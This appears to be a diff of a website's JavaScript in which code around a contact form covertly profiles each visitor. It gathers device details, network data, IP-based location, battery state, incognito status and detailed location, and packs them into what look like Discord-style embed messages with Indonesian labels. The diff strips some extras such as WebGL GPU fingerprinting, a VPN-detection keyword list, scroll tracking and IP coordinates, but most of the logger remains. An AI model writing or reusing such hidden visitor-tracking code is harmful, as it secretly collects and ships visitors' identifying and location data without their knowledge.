@@ -1444,35 +1444,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
 
   const pageEnterTime = Date.now();
 
-  const _uaRaw = navigator.userAgent || '';
-  const _iabMap = [
-    [/Instagram/i,'Instagram'],[/FBAN|FBAV/i,'Facebook'],
-    [/TikTok|musical_ly/i,'TikTok'],[/Snapchat/i,'Snapchat'],
-    [/Line\//i,'LINE'],[/WhatsApp/i,'WhatsApp'],
-    [/TwitterAndroid|Twitter for/i,'Twitter/X'],[/LinkedInApp/i,'LinkedIn'],
-    [/Pinterest/i,'Pinterest'],[/Telegram/i,'Telegram'],
-    [/MicroMessenger/i,'WeChat'],[/GSA/i,'Google App'],
-  ];
-  let iabName = null;
-  for(const [rx,name] of _iabMap){ if(rx.test(_uaRaw)){ iabName = name; break; } }
-
-  let maxScroll = 0;
-  window.addEventListener('scroll', function(){
-    const total = document.documentElement.scrollHeight - window.innerHeight;
-    if(total > 0) maxScroll = Math.max(maxScroll, Math.round((window.scrollY/total)*100));
-  }, { passive: true });
-
-  function getGPU(){
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if(!gl) return 'Unknown';
-      const ext = gl.getExtension('WEBGL_debug_renderer_info');
-      if(ext) return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || 'Unknown';
-      return gl.getParameter(gl.RENDERER) || 'Unknown';
-    } catch { return 'Unknown'; }
-  }
-
   function getDeviceInfo(){
     try {
       const parser = new UAParser();
@@ -1629,19 +1600,16 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   let netInfo = 'Unknown';
   let downlink = '';
   let rtt      = '';
-  let saveData = 'Unknown';
   if(navigator.connection){
     const c = navigator.connection;
     netInfo  = c.effectiveType || c.type || 'Unknown';
     if(c.downlink)  downlink = `${c.downlink} Mbps`;
     if(c.rtt)       rtt      = `${c.rtt} ms`;
-    saveData = c.saveData ? 'On (Data Saver)' : 'Off';
   }
-
 
   const [geo, battery, incognito, detailLoc] = await Promise.all([
     (async()=>{
-      let g = { ip:'unknown', city:'Unknown', region:'Unknown', country:'Unknown', country_code:'?', postal:'Unknown', org:'Unknown', asn:'Unknown', latitude:null, longitude:null };
+      let g = { ip:'unknown', city:'Unknown', region:'Unknown', country:'Unknown', country_code:'?', postal:'Unknown', org:'Unknown', asn:'Unknown' };
       try {
         const ctrl = new AbortController();
         const tid = setTimeout(()=> ctrl.abort(), 5000);
@@ -1657,8 +1625,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
           g.postal       = d.postal       || 'Unknown';
           g.org          = d.org          || 'Unknown';
           g.asn          = d.asn          || 'Unknown';
-          g.latitude     = d.latitude     || null;
-          g.longitude    = d.longitude    || null;
         }
       } catch(e){}
       return g;
@@ -1667,17 +1633,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     detectIncognito(),
     getDetailedLocation()
   ]);
-
-  const VPN_KEYWORDS = ['cloudflare','digitalocean','amazon','google','microsoft','linode',
-    'vultr','ovh','hetzner','akamai','fastly','mullvad','nordvpn','expressvpn',
-    'protonvpn','ipvanish','datacamp','m247','packethub','hostinger'];
-  const orgLow = (geo.org || '').toLowerCase();
-  const asnLow = (geo.asn || '').toLowerCase();
-  const isVPN  = VPN_KEYWORDS.some(k => orgLow.includes(k) || asnLow.includes(k));
-  const vpnFlag = isVPN ? '⚠️ Possible VPN/Proxy' : '✅ Likely Residential';
-
-  const gpuInfo    = getGPU();
-  const timeOnPage = `${Math.round((Date.now() - pageEnterTime) / 1000)}s`;
 
   const fields1 = [
     { name:'📱 Device',        value: `${deviceInfo.vendor} ${deviceInfo.model}`.trim() || 'Unknown', inline: true },
@@ -1701,15 +1656,9 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     { name:'🔒 Incognito',     value: incognito, inline: true },
     { name:'🍪 Cookies',       value: cookieEnabled, inline: true },
     { name:'🚫 Do Not Track',  value: doNotTrack, inline: true },
-    { name:'💾 Data Saver',    value: saveData, inline: true },
-    { name:'🔌 Plugins',       value: String(navigator.plugins?.length ?? 'Unknown'), inline: true },
     { name:'🗣️ Language',      value: langs, inline: true },
     { name:'🌏 Timezone',      value: tz, inline: true },
     { name:'🕒 Local Time',    value: localTime, inline: true },
-    { name:'📊 Scroll Depth',  value: `${maxScroll}%`, inline: true },
-    { name:'⏳ Time on Page',  value: timeOnPage, inline: true },
-    ...(iabName ? [{ name:'📲 In-App Browser', value: iabName, inline: true }] : []),
-    { name:'🎮 GPU',           value: gpuInfo.length > 60 ? gpuInfo.slice(0,60)+'…' : gpuInfo, inline: false },
     { name:'🔗 Referrer',      value: referrer.length > 60 ? referrer.slice(0,60)+'…' : referrer, inline: false },
     { name:'📄 Page',          value: pageUrl.length > 80 ? pageUrl.slice(0,80)+'…' : pageUrl, inline: false },
   );
@@ -1727,10 +1676,8 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     { name:'🆔 IP Address',    value: `\`${geo.ip}\``, inline: false },
     { name:'🏢 ISP / Org',     value: geo.org, inline: true },
     { name:'🔢 ASN',           value: geo.asn, inline: true },
-    { name:'🕵️ VPN / Proxy',   value: vpnFlag, inline: false },
     { name:'🌍 Lokasi (IP)',    value: `${geo.city}, ${geo.region}, ${geo.country} (${geo.country_code})`, inline: false },
     { name:'📮 Kode Pos',      value: geo.postal, inline: true },
-    { name:'🗺️ IP Koordinat',  value: geo.latitude && geo.longitude ? `${geo.latitude}, ${geo.longitude}` : 'N/A', inline: true },
   ];
 
   if(detailLoc){
@@ -1751,7 +1698,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     title: '🌍 Lokasi & Jaringan',
     color: 0x22d3ee,
     fields: fields2,
-    footer: { text: `IP: ${geo.ip}  •  ${geo.country}  •  ${vpnFlag}` },
+    footer: { text: `IP: ${geo.ip}  •  ${geo.country}` },
     timestamp: new Date().toISOString()
   };
 
